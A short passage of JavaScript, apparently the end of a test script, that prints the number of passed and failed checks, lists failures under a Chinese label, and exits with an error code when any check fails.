console.log(`\n${pass} passed, ${fail} failed`);
if (fail) { console.log('失败项：' + failures.join('；')); process.exit(1); }
